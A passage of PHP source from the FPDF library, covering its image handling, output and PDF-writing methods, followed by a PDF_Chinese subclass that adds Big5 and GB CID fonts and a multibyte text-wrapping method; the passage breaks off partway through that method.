				$this->x=$this->lMargin;
				$w=$this->w-$this->rMargin-$this->x;
				$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
		}
		else
			$i++;
	}
	//Last chunk
	if($i!=$j)
		$this->Cell($l/1000*$this->FontSize,$h,substr($s,$j),0,0,'',0,$link);
}

function Ln($h=null)
{
	//Line feed; default value is last cell height
	$this->x=$this->lMargin;
	if($h===null)
		$this->y+=$this->lasth;
	else
		$this->y+=$h;
}

function Image($file, $x=null, $y=null, $w=0, $h=0, $type='', $link='')
{
	//Put an image on the page
	if(!isset($this->images[$file]))
	{
		//First use of this image, get info
		if($type=='')
		{
			$pos=strrpos($file,'.');
			if(!$pos)
				$this->Error('Image file has no extension and no type was specified: '.$file);
			$type=substr($file,$pos+1);
		}
		$type=strtolower($type);
		if($type=='jpeg')
			$type='jpg';
		$mtd='_parse'.$type;
		if(!method_exists($this,$mtd))
			$this->Error('Unsupported image type: '.$type);
		$info=$this->$mtd($file);
		$info['i']=count($this->images)+1;
		$this->images[$file]=$info;
	}
	else
		$info=$this->images[$file];
	//Automatic width and height calculation if needed
	if($w==0 && $h==0)
	{
		//Put image at 72 dpi
		$w=$info['w']/$this->k;
		$h=$info['h']/$this->k;
	}
	elseif($w==0)
		$w=$h*$info['w']/$info['h'];
	elseif($h==0)
		$h=$w*$info['h']/$info['w'];
	//Flowing mode
	if($y===null)
	{
		if($this->y+$h>$this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak())
		{
			//Automatic page break
			$x2=$this->x;
			$this->AddPage($this->CurOrientation,$this->CurPageFormat);
			$this->x=$x2;
		}
		$y=$this->y;
		$this->y+=$h;
	}
	if($x===null)
		$x=$this->x;
	$this->_out(sprintf('q %.2F 0 0 %.2F %.2F %.2F cm /I%d Do Q',$w*$this->k,$h*$this->k,$x*$this->k,($this->h-($y+$h))*$this->k,$info['i']));
	if($link)
		$this->Link($x,$y,$w,$h,$link);
}

function GetX()
{
	//Get x position
	return $this->x;
}

function SetX($x)
{
	//Set x position
	if($x>=0)
		$this->x=$x;
	else
		$this->x=$this->w+$x;
}

function GetY()
{
	//Get y position
	return $this->y;
}

function SetY($y)
{
	//Set y position and reset x
	$this->x=$this->lMargin;
	if($y>=0)
		$this->y=$y;
	else
		$this->y=$this->h+$y;
}

function SetXY($x, $y)
{
	//Set x and y positions
	$this->SetY($y);
	$this->SetX($x);
}

function Output($name='', $dest='')
{
	//Output PDF to some destination
	if($this->state<3)
		$this->Close();
	$dest=strtoupper($dest);
	if($dest=='')
	{
		if($name=='')
		{
			$name='doc.pdf';
			$dest='I';
		}
		else
			$dest='F';
	}
	switch($dest)
	{
		case 'I':
			//Send to standard output
			if(ob_get_length())
				$this->Error('Some data has already been output, can\'t send PDF file');
			if(php_sapi_name()!='cli')
			{
				//We send to a browser
				header('Content-Type: application/pdf');
				if(headers_sent())
					$this->Error('Some data has already been output, can\'t send PDF file');
				header('Content-Length: '.strlen($this->buffer));
				header('Content-Disposition: inline; filename="'.$name.'"');
				header('Cache-Control: private, max-age=0, must-revalidate');
				header('Pragma: public');
				ini_set('zlib.output_compression','0');
			}
			echo $this->buffer;
			break;
		case 'D':
			//Download file
			if(ob_get_length())
				$this->Error('Some data has already been output, can\'t send PDF file');
			header('Content-Type: application/x-download');
			if(headers_sent())
				$this->Error('Some data has already been output, can\'t send PDF file');
			header('Content-Length: '.strlen($this->buffer));
			header('Content-Disposition: attachment; filename="'.$name.'"');
			header('Cache-Control: private, max-age=0, must-revalidate');
			header('Pragma: public');
			ini_set('zlib.output_compression','0');
			echo $this->buffer;
			break;
		case 'F':
			//Save to local file
			$f=fopen($name,'wb');
			if(!$f)
				$this->Error('Unable to create output file: '.$name);
			fwrite($f,$this->buffer,strlen($this->buffer));
			fclose($f);
			break;
		case 'S':
			//Return as a string
			return $this->buffer;
		default:
			$this->Error('Incorrect output destination: '.$dest);
	}
	return '';
}

/*******************************************************************************
*                                                                              *
*                              Protected methods                               *
*                                                                              *
*******************************************************************************/
function _dochecks()
{
	//Check availability of %F
	if(sprintf('%.1F',1.0)!='1.0')
		$this->Error('This version of PHP is not supported');
	//Check mbstring overloading
	if(ini_get('mbstring.func_overload') & 2)
		$this->Error('mbstring overloading must be disabled');
	//Disable runtime magic quotes
	if(get_magic_quotes_runtime())
		@set_magic_quotes_runtime(0);
}

function _getpageformat($format)
{
	$format=strtolower($format);
	if(!isset($this->PageFormats[$format]))
		$this->Error('Unknown page format: '.$format);
	$a=$this->PageFormats[$format];
	return array($a[0]/$this->k, $a[1]/$this->k);
}

function _getfontpath()
{
	if(!defined('FPDF_FONTPATH') && is_dir(dirname(__FILE__).'/font'))
		define('FPDF_FONTPATH',dirname(__FILE__).'/font/');
	return defined('FPDF_FONTPATH') ? FPDF_FONTPATH : '';
}

function _beginpage($orientation, $format)
{
	$this->page++;
	$this->pages[$this->page]='';
	$this->state=2;
	$this->x=$this->lMargin;
	$this->y=$this->tMargin;
	$this->FontFamily='';
	//Check page size
	if($orientation=='')
		$orientation=$this->DefOrientation;
	else
		$orientation=strtoupper($orientation[0]);
	if($format=='')
		$format=$this->DefPageFormat;
	else
	{
		if(is_string($format))
			$format=$this->_getpageformat($format);
	}
	if($orientation!=$this->CurOrientation || $format[0]!=$this->CurPageFormat[0] || $format[1]!=$this->CurPageFormat[1])
	{
		//New size
		if($orientation=='P')
		{
			$this->w=$format[0];
			$this->h=$format[1];
		}
		else
		{
			$this->w=$format[1];
			$this->h=$format[0];
		}
		$this->wPt=$this->w*$this->k;
		$this->hPt=$this->h*$this->k;
		$this->PageBreakTrigger=$this->h-$this->bMargin;
		$this->CurOrientation=$orientation;
		$this->CurPageFormat=$format;
	}
	if($orientation!=$this->DefOrientation || $format[0]!=$this->DefPageFormat[0] || $format[1]!=$this->DefPageFormat[1])
		$this->PageSizes[$this->page]=array($this->wPt, $this->hPt);
}

function _endpage()
{
	$this->state=1;
}

function _escape($s)
{
	//Escape special characters in strings
	$s=str_replace('\\','\\\\',$s);
	$s=str_replace('(','\\(',$s);
	$s=str_replace(')','\\)',$s);
	$s=str_replace("\r",'\\r',$s);
	return $s;
}

function _textstring($s)
{
	//Format a text string
	return '('.$this->_escape($s).')';
}

function _UTF8toUTF16($s)
{
	//Convert UTF-8 to UTF-16BE with BOM
	$res="\xFE\xFF";
	$nb=strlen($s);
	$i=0;
	while($i<$nb)
	{
		$c1=ord($s[$i++]);
		if($c1>=224)
		{
			//3-byte character
			$c2=ord($s[$i++]);
			$c3=ord($s[$i++]);
			$res.=chr((($c1 & 0x0F)<<4) + (($c2 & 0x3C)>>2));
			$res.=chr((($c2 & 0x03)<<6) + ($c3 & 0x3F));
		}
		elseif($c1>=192)
		{
			//2-byte character
			$c2=ord($s[$i++]);
			$res.=chr(($c1 & 0x1C)>>2);
			$res.=chr((($c1 & 0x03)<<6) + ($c2 & 0x3F));
		}
		else
		{
			//Single-byte character
			$res.="\0".chr($c1);
		}
	}
	return $res;
}

function _dounderline($x, $y, $txt)
{
	//Underline text
	$up=$this->CurrentFont['up'];
	$ut=$this->CurrentFont['ut'];
	$w=$this->GetStringWidth($txt)+$this->ws*substr_count($txt,' ');
	return sprintf('%.2F %.2F %.2F %.2F re f',$x*$this->k,($this->h-($y-$up/1000*$this->FontSize))*$this->k,$w*$this->k,-$ut/1000*$this->FontSizePt);
}

function _parsejpg($file)
{
	//Extract info from a JPEG file
	$a=GetImageSize($file);
	if(!$a)
		$this->Error('Missing or incorrect image file: '.$file);
	if($a[2]!=2)
		$this->Error('Not a JPEG file: '.$file);
	if(!isset($a['channels']) || $a['channels']==3)
		$colspace='DeviceRGB';
	elseif($a['channels']==4)
		$colspace='DeviceCMYK';
	else
		$colspace='DeviceGray';
	$bpc=isset($a['bits']) ? $a['bits'] : 8;
	//Read whole file
	$f=fopen($file,'rb');
	$data='';
	while(!feof($f))
		$data.=fread($f,8192);
	fclose($f);
	return array('w'=>$a[0], 'h'=>$a[1], 'cs'=>$colspace, 'bpc'=>$bpc, 'f'=>'DCTDecode', 'data'=>$data);
}

function _parsepng($file)
{
	//Extract info from a PNG file
	$f=fopen($file,'rb');
	if(!$f)
		$this->Error('Can\'t open image file: '.$file);
	//Check signature
	if($this->_readstream($f,8)!=chr(137).'PNG'.chr(13).chr(10).chr(26).chr(10))
		$this->Error('Not a PNG file: '.$file);
	//Read header chunk
	$this->_readstream($f,4);
	if($this->_readstream($f,4)!='IHDR')
		$this->Error('Incorrect PNG file: '.$file);
	$w=$this->_readint($f);
	$h=$this->_readint($f);
	$bpc=ord($this->_readstream($f,1));
	if($bpc>8)
		$this->Error('16-bit depth not supported: '.$file);
	$ct=ord($this->_readstream($f,1));
	if($ct==0)
		$colspace='DeviceGray';
	elseif($ct==2)
		$colspace='DeviceRGB';
	elseif($ct==3)
		$colspace='Indexed';
	else
		$this->Error('Alpha channel not supported: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Unknown compression method: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Unknown filter method: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Interlacing not supported: '.$file);
	$this->_readstream($f,4);
	$parms='/DecodeParms <</Predictor 15 /Colors '.($ct==2 ? 3 : 1).' /BitsPerComponent '.$bpc.' /Columns '.$w.'>>';
	//Scan chunks looking for palette, transparency and image data
	$pal='';
	$trns='';
	$data='';
	do
	{
		$n=$this->_readint($f);
		$type=$this->_readstream($f,4);
		if($type=='PLTE')
		{
			//Read palette
			$pal=$this->_readstream($f,$n);
			$this->_readstream($f,4);
		}
		elseif($type=='tRNS')
		{
			//Read transparency info
			$t=$this->_readstream($f,$n);
			if($ct==0)
				$trns=array(ord(substr($t,1,1)));
			elseif($ct==2)
				$trns=array(ord(substr($t,1,1)), ord(substr($t,3,1)), ord(substr($t,5,1)));
			else
			{
				$pos=strpos($t,chr(0));
				if($pos!==false)
					$trns=array($pos);
			}
			$this->_readstream($f,4);
		}
		elseif($type=='IDAT')
		{
			//Read image data block
			$data.=$this->_readstream($f,$n);
			$this->_readstream($f,4);
		}
		elseif($type=='IEND')
			break;
		else
			$this->_readstream($f,$n+4);
	}
	while($n);
	if($colspace=='Indexed' && empty($pal))
		$this->Error('Missing palette in '.$file);
	fclose($f);
	return array('w'=>$w, 'h'=>$h, 'cs'=>$colspace, 'bpc'=>$bpc, 'f'=>'FlateDecode', 'parms'=>$parms, 'pal'=>$pal, 'trns'=>$trns, 'data'=>$data);
}

function _readstream($f, $n)
{
	//Read n bytes from stream
	$res='';
	while($n>0 && !feof($f))
	{
		$s=fread($f,$n);
		if($s===false)
			$this->Error('Error while reading stream');
		$n-=strlen($s);
		$res.=$s;
	}
	if($n>0)
		$this->Error('Unexpected end of stream');
	return $res;
}

function _readint($f)
{
	//Read a 4-byte integer from stream
	$a=unpack('Ni',$this->_readstream($f,4));
	return $a['i'];
}

function _parsegif($file)
{
	//Extract info from a GIF file (via PNG conversion)
	if(!function_exists('imagepng'))
		$this->Error('GD extension is required for GIF support');
	if(!function_exists('imagecreatefromgif'))
		$this->Error('GD has no GIF read support');
	$im=imagecreatefromgif($file);
	if(!$im)
		$this->Error('Missing or incorrect image file: '.$file);
	imageinterlace($im,0);
	$tmp=tempnam('.','gif');
	if(!$tmp)
		$this->Error('Unable to create a temporary file');
	if(!imagepng($im,$tmp))
		$this->Error('Error while saving to temporary file');
	imagedestroy($im);
	$info=$this->_parsepng($tmp);
	unlink($tmp);
	return $info;
}

function _newobj()
{
	//Begin a new object
	$this->n++;
	$this->offsets[$this->n]=strlen($this->buffer);
	$this->_out($this->n.' 0 obj');
}

function _putstream($s)
{
	$this->_out('stream');
	$this->_out($s);
	$this->_out('endstream');
}

function _out($s)
{
	//Add a line to the document
	if($this->state==2)
		$this->pages[$this->page].=$s."\n";
	else
		$this->buffer.=$s."\n";
}

function _putpages()
{
	$nb=$this->page;
	if(!empty($this->AliasNbPages))
	{
		//Replace number of pages
		for($n=1;$n<=$nb;$n++)
			$this->pages[$n]=str_replace($this->AliasNbPages,$nb,$this->pages[$n]);
	}
	if($this->DefOrientation=='P')
	{
		$wPt=$this->DefPageFormat[0]*$this->k;
		$hPt=$this->DefPageFormat[1]*$this->k;
	}
	else
	{
		$wPt=$this->DefPageFormat[1]*$this->k;
		$hPt=$this->DefPageFormat[0]*$this->k;
	}
	$filter=($this->compress) ? '/Filter /FlateDecode ' : '';
	for($n=1;$n<=$nb;$n++)
	{
		//Page
		$this->_newobj();
		$this->_out('<</Type /Page');
		$this->_out('/Parent 1 0 R');
		if(isset($this->PageSizes[$n]))
			$this->_out(sprintf('/MediaBox [0 0 %.2F %.2F]',$this->PageSizes[$n][0],$this->PageSizes[$n][1]));
		$this->_out('/Resources 2 0 R');
		if(isset($this->PageLinks[$n]))
		{
			//Links
			$annots='/Annots [';
			foreach($this->PageLinks[$n] as $pl)
			{
				$rect=sprintf('%.2F %.2F %.2F %.2F',$pl[0],$pl[1],$pl[0]+$pl[2],$pl[1]-$pl[3]);
				$annots.='<</Type /Annot /Subtype /Link /Rect ['.$rect.'] /Border [0 0 0] ';
				if(is_string($pl[4]))
					$annots.='/A <</S /URI /URI '.$this->_textstring($pl[4]).'>>>>';
				else
				{
					$l=$this->links[$pl[4]];
					$h=isset($this->PageSizes[$l[0]]) ? $this->PageSizes[$l[0]][1] : $hPt;
					$annots.=sprintf('/Dest [%d 0 R /XYZ 0 %.2F null]>>',1+2*$l[0],$h-$l[1]*$this->k);
				}
			}
			$this->_out($annots.']');
		}
		$this->_out('/Contents '.($this->n+1).' 0 R>>');
		$this->_out('endobj');
		//Page content
		$p=($this->compress) ? gzcompress($this->pages[$n]) : $this->pages[$n];
		$this->_newobj();
		$this->_out('<<'.$filter.'/Length '.strlen($p).'>>');
		$this->_putstream($p);
		$this->_out('endobj');
	}
	//Pages root
	$this->offsets[1]=strlen($this->buffer);
	$this->_out('1 0 obj');
	$this->_out('<</Type /Pages');
	$kids='/Kids [';
	for($i=0;$i<$nb;$i++)
		$kids.=(3+2*$i).' 0 R ';
	$this->_out($kids.']');
	$this->_out('/Count '.$nb);
	$this->_out(sprintf('/MediaBox [0 0 %.2F %.2F]',$wPt,$hPt));
	$this->_out('>>');
	$this->_out('endobj');
}

function _putfonts()
{
	$nf=$this->n;
	foreach($this->diffs as $diff)
	{
		//Encodings
		$this->_newobj();
		$this->_out('<</Type /Encoding /BaseEncoding /WinAnsiEncoding /Differences ['.$diff.']>>');
		$this->_out('endobj');
	}
	foreach($this->FontFiles as $file=>$info)
	{
		//Font file embedding
		$this->_newobj();
		$this->FontFiles[$file]['n']=$this->n;
		$font='';
		$f=fopen($this->_getfontpath().$file,'rb',1);
		if(!$f)
			$this->Error('Font file not found');
		while(!feof($f))
			$font.=fread($f,8192);
		fclose($f);
		$compressed=(substr($file,-2)=='.z');
		if(!$compressed && isset($info['length2']))
		{
			$header=(ord($font[0])==128);
			if($header)
			{
				//Strip first binary header
				$font=substr($font,6);
			}
			if($header && ord($font[$info['length1']])==128)
			{
				//Strip second binary header
				$font=substr($font,0,$info['length1']).substr($font,$info['length1']+6);
			}
		}
		$this->_out('<</Length '.strlen($font));
		if($compressed)
			$this->_out('/Filter /FlateDecode');
		$this->_out('/Length1 '.$info['length1']);
		if(isset($info['length2']))
			$this->_out('/Length2 '.$info['length2'].' /Length3 0');
		$this->_out('>>');
		$this->_putstream($font);
		$this->_out('endobj');
	}
	foreach($this->fonts as $k=>$font)
	{
		//Font objects
		$this->fonts[$k]['n']=$this->n+1;
		$type=$font['type'];
		$name=$font['name'];
		if($type=='core')
		{
			//Standard font
			$this->_newobj();
			$this->_out('<</Type /Font');
			$this->_out('/BaseFont /'.$name);
			$this->_out('/Subtype /Type1');
			if($name!='Symbol' && $name!='ZapfDingbats')
				$this->_out('/Encoding /WinAnsiEncoding');
			$this->_out('>>');
			$this->_out('endobj');
		}
		elseif($type=='Type1' || $type=='TrueType')
		{
			//Additional Type1 or TrueType font
			$this->_newobj();
			$this->_out('<</Type /Font');
			$this->_out('/BaseFont /'.$name);
			$this->_out('/Subtype /'.$type);
			$this->_out('/FirstChar 32 /LastChar 255');
			$this->_out('/Widths '.($this->n+1).' 0 R');
			$this->_out('/FontDescriptor '.($this->n+2).' 0 R');
			if($font['enc'])
			{
				if(isset($font['diff']))
					$this->_out('/Encoding '.($nf+$font['diff']).' 0 R');
				else
					$this->_out('/Encoding /WinAnsiEncoding');
			}
			$this->_out('>>');
			$this->_out('endobj');
			//Widths
			$this->_newobj();
			$cw=&$font['cw'];
			$s='[';
			for($i=32;$i<=255;$i++)
				$s.=$cw[chr($i)].' ';
			$this->_out($s.']');
			$this->_out('endobj');
			//Descriptor
			$this->_newobj();
			$s='<</Type /FontDescriptor /FontName /'.$name;
			foreach($font['desc'] as $k=>$v)
				$s.=' /'.$k.' '.$v;
			$file=$font['file'];
			if($file)
				$s.=' /FontFile'.($type=='Type1' ? '' : '2').' '.$this->FontFiles[$file]['n'].' 0 R';
			$this->_out($s.'>>');
			$this->_out('endobj');
		}
		else
		{
			//Allow for additional types
			$mtd='_put'.strtolower($type);
			if(!method_exists($this,$mtd))
				$this->Error('Unsupported font type: '.$type);
			$this->$mtd($font);
		}
	}
}

function _putimages()
{
	$filter=($this->compress) ? '/Filter /FlateDecode ' : '';
	reset($this->images);
	while(list($file,$info)=each($this->images))
	{
		$this->_newobj();
		$this->images[$file]['n']=$this->n;
		$this->_out('<</Type /XObject');
		$this->_out('/Subtype /Image');
		$this->_out('/Width '.$info['w']);
		$this->_out('/Height '.$info['h']);
		if($info['cs']=='Indexed')
			$this->_out('/ColorSpace [/Indexed /DeviceRGB '.(strlen($info['pal'])/3-1).' '.($this->n+1).' 0 R]');
		else
		{
			$this->_out('/ColorSpace /'.$info['cs']);
			if($info['cs']=='DeviceCMYK')
				$this->_out('/Decode [1 0 1 0 1 0 1 0]');
		}
		$this->_out('/BitsPerComponent '.$info['bpc']);
		if(isset($info['f']))
			$this->_out('/Filter /'.$info['f']);
		if(isset($info['parms']))
			$this->_out($info['parms']);
		if(isset($info['trns']) && is_array($info['trns']))
		{
			$trns='';
			for($i=0;$i<count($info['trns']);$i++)
				$trns.=$info['trns'][$i].' '.$info['trns'][$i].' ';
			$this->_out('/Mask ['.$trns.']');
		}
		$this->_out('/Length '.strlen($info['data']).'>>');
		$this->_putstream($info['data']);
		unset($this->images[$file]['data']);
		$this->_out('endobj');
		//Palette
		if($info['cs']=='Indexed')
		{
			$this->_newobj();
			$pal=($this->compress) ? gzcompress($info['pal']) : $info['pal'];
			$this->_out('<<'.$filter.'/Length '.strlen($pal).'>>');
			$this->_putstream($pal);
			$this->_out('endobj');
		}
	}
}

function _putxobjectdict()
{
	foreach($this->images as $image)
		$this->_out('/I'.$image['i'].' '.$image['n'].' 0 R');
}

function _putresourcedict()
{
	$this->_out('/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]');
	$this->_out('/Font <<');
	foreach($this->fonts as $font)
		$this->_out('/F'.$font['i'].' '.$font['n'].' 0 R');
	$this->_out('>>');
	$this->_out('/XObject <<');
	$this->_putxobjectdict();
	$this->_out('>>');
}

function _putresources()
{
	$this->_putfonts();
	$this->_putimages();
	//Resource dictionary
	$this->offsets[2]=strlen($this->buffer);
	$this->_out('2 0 obj');
	$this->_out('<<');
	$this->_putresourcedict();
	$this->_out('>>');
	$this->_out('endobj');
}

function _putinfo()
{
	$this->_out('/Producer '.$this->_textstring('FPDF '.FPDF_VERSION));
	if(!empty($this->title))
		$this->_out('/Title '.$this->_textstring($this->title));
	if(!empty($this->subject))
		$this->_out('/Subject '.$this->_textstring($this->subject));
	if(!empty($this->author))
		$this->_out('/Author '.$this->_textstring($this->author));
	if(!empty($this->keywords))
		$this->_out('/Keywords '.$this->_textstring($this->keywords));
	if(!empty($this->creator))
		$this->_out('/Creator '.$this->_textstring($this->creator));
	$this->_out('/CreationDate '.$this->_textstring('D:'.@date('YmdHis')));
}

function _putcatalog()
{
	$this->_out('/Type /Catalog');
	$this->_out('/Pages 1 0 R');
	if($this->ZoomMode=='fullpage')
		$this->_out('/OpenAction [3 0 R /Fit]');
	elseif($this->ZoomMode=='fullwidth')
		$this->_out('/OpenAction [3 0 R /FitH null]');
	elseif($this->ZoomMode=='real')
		$this->_out('/OpenAction [3 0 R /XYZ null null 1]');
	elseif(!is_string($this->ZoomMode))
		$this->_out('/OpenAction [3 0 R /XYZ null null '.($this->ZoomMode/100).']');
	if($this->LayoutMode=='single')
		$this->_out('/PageLayout /SinglePage');
	elseif($this->LayoutMode=='continuous')
		$this->_out('/PageLayout /OneColumn');
	elseif($this->LayoutMode=='two')
		$this->_out('/PageLayout /TwoColumnLeft');
}

function _putheader()
{
	$this->_out('%PDF-'.$this->PDFVersion);
}

function _puttrailer()
{
	$this->_out('/Size '.($this->n+1));
	$this->_out('/Root '.$this->n.' 0 R');
	$this->_out('/Info '.($this->n-1).' 0 R');
}

function _enddoc()
{
	$this->_putheader();
	$this->_putpages();
	$this->_putresources();
	//Info
	$this->_newobj();
	$this->_out('<<');
	$this->_putinfo();
	$this->_out('>>');
	$this->_out('endobj');
	//Catalog
	$this->_newobj();
	$this->_out('<<');
	$this->_putcatalog();
	$this->_out('>>');
	$this->_out('endobj');
	//Cross-ref
	$o=strlen($this->buffer);
	$this->_out('xref');
	$this->_out('0 '.($this->n+1));
	$this->_out('0000000000 65535 f ');
	for($i=1;$i<=$this->n;$i++)
		$this->_out(sprintf('%010d 00000 n ',$this->offsets[$i]));
	//Trailer
	$this->_out('trailer');
	$this->_out('<<');
	$this->_puttrailer();
	$this->_out('>>');
	$this->_out('startxref');
	$this->_out($o);
	$this->_out('%%EOF');
	$this->state=3;
}
//End of class
}

//Handle special IE contype request
if(isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT']=='contype')
{
	header('Content-Type: application/pdf');
	exit;
}
?>

<?php 
//require('fpdf.php');

$Big5_widths = array(' '=>250,'!'=>250,'"'=>408,'#'=>668,'$'=>490,'%'=>875,'&'=>698,'\''=>250,
	'('=>240,')'=>240,'*'=>417,'+'=>667,','=>250,'-'=>313,'.'=>250,'/'=>520,'0'=>500,'1'=>500,
	'2'=>500,'3'=>500,'4'=>500,'5'=>500,'6'=>500,'7'=>500,'8'=>500,'9'=>500,':'=>250,';'=>250,
	'<'=>667,'='=>667,'>'=>667,'?'=>396,'@'=>921,'A'=>677,'B'=>615,'C'=>719,'D'=>760,'E'=>625,
	'F'=>552,'G'=>771,'H'=>802,'I'=>354,'J'=>354,'K'=>781,'L'=>604,'M'=>927,'N'=>750,'O'=>823,
	'P'=>563,'Q'=>823,'R'=>729,'S'=>542,'T'=>698,'U'=>771,'V'=>729,'W'=>948,'X'=>771,'Y'=>677,
	'Z'=>635,'['=>344,'\\'=>520,']'=>344,'^'=>469,'_'=>500,'`'=>250,'a'=>469,'b'=>521,'c'=>427,
	'd'=>521,'e'=>438,'f'=>271,'g'=>469,'h'=>531,'i'=>250,'j'=>250,'k'=>458,'l'=>240,'m'=>802,
	'n'=>531,'o'=>500,'p'=>521,'q'=>521,'r'=>365,'s'=>333,'t'=>292,'u'=>521,'v'=>458,'w'=>677,
	'x'=>479,'y'=>458,'z'=>427,'{'=>480,'|'=>496,'}'=>480,'~'=>667);

$GB_widths = array(' '=>207,'!'=>270,'"'=>342,'#'=>467,'$'=>462,'%'=>797,'&'=>710,'\''=>239,
	'('=>374,')'=>374,'*'=>423,'+'=>605,','=>238,'-'=>375,'.'=>238,'/'=>334,'0'=>462,'1'=>462,
	'2'=>462,'3'=>462,'4'=>462,'5'=>462,'6'=>462,'7'=>462,'8'=>462,'9'=>462,':'=>238,';'=>238,
	'<'=>605,'='=>605,'>'=>605,'?'=>344,'@'=>748,'A'=>684,'B'=>560,'C'=>695,'D'=>739,'E'=>563,
	'F'=>511,'G'=>729,'H'=>793,'I'=>318,'J'=>312,'K'=>666,'L'=>526,'M'=>896,'N'=>758,'O'=>772,
	'P'=>544,'Q'=>772,'R'=>628,'S'=>465,'T'=>607,'U'=>753,'V'=>711,'W'=>972,'X'=>647,'Y'=>620,
	'Z'=>607,'['=>374,'\\'=>333,']'=>374,'^'=>606,'_'=>500,'`'=>239,'a'=>417,'b'=>503,'c'=>427,
	'd'=>529,'e'=>415,'f'=>264,'g'=>444,'h'=>518,'i'=>241,'j'=>230,'k'=>495,'l'=>228,'m'=>793,
	'n'=>527,'o'=>524,'p'=>524,'q'=>504,'r'=>338,'s'=>336,'t'=>277,'u'=>517,'v'=>450,'w'=>652,
	'x'=>466,'y'=>452,'z'=>407,'{'=>370,'|'=>258,'}'=>370,'~'=>605);

class PDF_Chinese extends FPDF
{
function AddCIDFont($family, $style, $name, $cw, $CMap, $registry)
{
	$fontkey = strtolower($family).strtoupper($style);
	if(isset($this->fonts[$fontkey]))
		$this->Error("Font already added: $family $style");
	$i = count($this->fonts)+1;
	$name = str_replace(' ','',$name);
	$this->fonts[$fontkey] = array('i'=>$i, 'type'=>'Type0', 'name'=>$name, 'up'=>-130, 'ut'=>40, 'cw'=>$cw, 'CMap'=>$CMap, 'registry'=>$registry);
}

function AddCIDFonts($family, $name, $cw, $CMap, $registry)
{
	$this->AddCIDFont($family,'',$name,$cw,$CMap,$registry);
	$this->AddCIDFont($family,'B',$name.',Bold',$cw,$CMap,$registry);
	$this->AddCIDFont($family,'I',$name.',Italic',$cw,$CMap,$registry);
	$this->AddCIDFont($family,'BI',$name.',BoldItalic',$cw,$CMap,$registry);
}

function AddBig5Font($family='Big5', $name='MSungStd-Light-Acro')
{
	// Add Big5 font with proportional Latin
	$cw = $GLOBALS['Big5_widths'];
	$CMap = 'ETenms-B5-H';
	$registry = array('ordering'=>'CNS1', 'supplement'=>0);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function AddBig5hwFont($family='Big5-hw', $name='MSungStd-Light-Acro')
{
	// Add Big5 font with half-witdh Latin
	for($i=32;$i<=126;$i++)
		$cw[chr($i)] = 500;
	$CMap = 'ETen-B5-H';
	$registry = array('ordering'=>'CNS1', 'supplement'=>0);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function AddGBFont($family='GB', $name='STSongStd-Light-Acro')
{
	// Add GB font with proportional Latin
	$cw = $GLOBALS['GB_widths'];
	$CMap = 'GBKp-EUC-H';
	$registry = array('ordering'=>'GB1', 'supplement'=>2);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function AddGBhwFont($family='GB-hw', $name='STSongStd-Light-Acro')
{
	// Add GB font with half-width Latin
	for($i=32;$i<=126;$i++)
		$cw[chr($i)] = 500;
	$CMap = 'GBK-EUC-H';
	$registry = array('ordering'=>'GB1', 'supplement'=>2);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function GetStringWidth($s)
{
	if($this->CurrentFont['type']=='Type0')
		return $this->GetMBStringWidth($s);
	else
		return parent::GetStringWidth($s);
}

function GetMBStringWidth($s)
{
	// Multi-byte version of GetStringWidth()
	$l = 0;
	$cw = &$this->CurrentFont['cw'];
	$nb = strlen($s);
	$i = 0;
	while($i<$nb)
	{
		$c = $s[$i];
		if(ord($c)<128)
		{
			$l += $cw[$c];
			$i++;
		}
		else
		{
			$l += 1000;
			$i += 2;
		}
	}
	return $l*$this->FontSize/1000;
}

function MultiCell($w, $h, $txt, $border=0, $align='L', $fill=0)
{
	if($this->CurrentFont['type']=='Type0')
		$this->MBMultiCell($w,$h,$txt,$border,$align,$fill);
	else
		parent::MultiCell($w,$h,$txt,$border,$align,$fill);
}

function MBMultiCell($w, $h, $txt, $border=0, $align='L', $fill=0)
{
	// Multi-byte version of MultiCell()
	$cw = &$this->CurrentFont['cw'];
	if($w==0)
		$w = $this->w-$this->rMargin-$this->x;
	$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
	$s = str_replace("\r",'',$txt);
	$nb = strlen($s);
	if($nb>0 && $s[$nb-1]=="\n")
		$nb--;
	$b = 0;
	if($border)
	{
		if($border==1)
		{
			$border = 'LTRB';
			$b = 'LRT';
			$b2 = 'LR';
		}
		else
		{
			$b2 = '';
			if(is_int(strpos($border,'L')))
				$b2 .= 'L';
			if(is_int(strpos($border,'R')))
				$b2 .= 'R';
			$b = is_int(strpos($border,'T')) ? $b2.'T' : $b2;
		}
	}
	$sep = -1;
	$i = 0;
	$j = 0;
	$l = 0;
	$nl = 1;
	while($i<$nb)
	{
		// Get next character
		$c = $s[$i];
		// Check if ASCII or MB
		$ascii = (ord($c)<128);
		if($c=="\n")
		{
			// Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			$i++;
			$sep = -1;
			$j = $i;
			$l = 0;
			$nl++;
			if($border && $nl==2)
				$b = $b2;
			continue;
		}
		if(!$ascii)
		{
			$sep = $i;
			$ls = $l;
		}
		elseif($c==' ')
		{
			$sep = $i;
			$ls = $l;
		}
		$l += $ascii ? $cw[$c] : 1000;
		if($l>$wmax)
		{
			// Automatic line break
			if($sep==-1 || $i==$j)
			{
				if($i==$j)
					$i += $ascii ? 1 : 2;
				$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),$b,2,$align,$fill);
				$i = ($s[$sep]==' ') ? $sep+1 : $sep;
			}
			$sep = -1;
			$j = $i;
			$l = 0;
			$nl++;
			if($border && $nl==2)
				$b = $b2;
		}
		else
			$i += $ascii ? 1 : 2;
	}
	// Last chunk
	if($border && is_int(strpos($border,'B')))
		$b .= 'B';
	$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
